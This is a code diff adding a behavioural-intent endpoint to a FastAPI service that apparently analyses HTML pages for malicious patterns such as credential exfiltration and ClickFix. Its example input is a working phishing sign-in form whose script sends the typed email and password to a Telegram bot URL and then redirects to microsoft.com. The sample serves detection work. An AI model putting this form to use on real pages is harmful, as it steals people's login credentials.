@@ -1,4 +1,5 @@
-"""Public API routes: Part 2 preprocessing, Part 3 DOM features, Part 7 JS analysis, Part 9 (stub).
+"""Public API routes: Part 2 preprocessing, Part 3 DOM features, Part 7 JS analysis,
+Part 8 behavioral intent, Part 9 (stub).
 
 Part 9: Preliminary tri-modal output (fusion + FastAPI).
 """
@@ -8,10 +9,12 @@ from __future__ import annotations
 from fastapi import APIRouter, HTTPException, Response
 from pydantic import BaseModel, ConfigDict, Field
 
+from c2_analyzer.behavior.pipeline import behavior_for_html
 from c2_analyzer.dom.pipeline import dom_features_for_html
 from c2_analyzer.js_analyzer.pipeline import js_analysis_for_html
 from c2_analyzer.preprocessing.pipeline import preprocess_html
 from c2_analyzer.schemas.analysis import AnalysisRequest, AnalysisResponse
+from c2_analyzer.schemas.behavior import BehaviorResult
 from c2_analyzer.schemas.dom import DomResult
 from c2_analyzer.schemas.js import JsAnalysisResult
 from c2_analyzer.schemas.parsed_page import ParsedPage
@@ -133,6 +136,58 @@ def js_analysis(request: JsAnalysisRequest) -> Response:
     code as ``analyze_js.py`` - the numbers match the dataset CSV.
     """
     result = js_analysis_for_html(request.html, request.url)
+    return Response(result.model_dump_json(), media_type="application/json")
+
+
+EXAMPLE_BEHAVIOR_HTML = (
+    "<html><head><title>Verify</title></head><body>"
+    '<form id="f"><input type="email" id="email"><input type="password" id="password">'
+    "<button>Sign in</button></form><script>"
+    "var api = 'https://api.telegram.org/bot123:ABC/sendMessage';"
+    "document.getElementById('f').addEventListener('submit', function (e) {"
+    " e.preventDefault(); var p = document.getElementById('password').value;"
+    " var u = document.getElementById('email').value;"
+    " fetch(api, {method: 'POST', body: JSON.stringify({text: u + ':' + p})});"
+    " location.replace('https://www.microsoft.com/');"
+    "});</script></body></html>"
+)
+
+
+class BehaviorRequest(PreprocessRequest):
+    """Input to ``POST /api/v1/behavior`` (same fields as /preprocess)."""
+
+    model_config = ConfigDict(
+        json_schema_extra={
+            "examples": [
+                {"html": EXAMPLE_BEHAVIOR_HTML, "url": "https://account-verify.example/login"},
+                {
+                    "html": "<script>window.location.replace('https://offer.example/');</script>",
+                    "url": "https://news.example/",
+                },
+            ]
+        }
+    )
+
+
+@router.post(
+    "/api/v1/behavior",
+    response_model=BehaviorResult,
+    tags=["Behavioral intent (Part 8)"],
+    summary="HTML -> sources, sinks, flows and behavioral patterns with evidence (Part 8)",
+    responses={413: {"description": "request body larger than 5 MB"}},
+)
+def behavior(request: BehaviorRequest) -> Response:
+    """Run Part 2, Part 7 and Part 8 on one HTML string.
+
+    Links sensitive SOURCES (credential fields, keystrokes, cookies, clipboard
+    ...) to SINKS (external requests, redirects, clipboard writes, eval ...)
+    with a lightweight static taint analysis and reports the behavioral
+    patterns (credential exfiltration, forced redirect, ClickFix, suspicious
+    download, obfuscated execution ...) with severity, a plain-English message
+    and the evidence chain (source line -> assignments -> sink line). Nothing
+    is executed or downloaded. Same code as ``map_behavior.py``.
+    """
+    _, _, result = behavior_for_html(request.html, request.url)
     return Response(result.model_dump_json(), media_type="application/json")
 
 
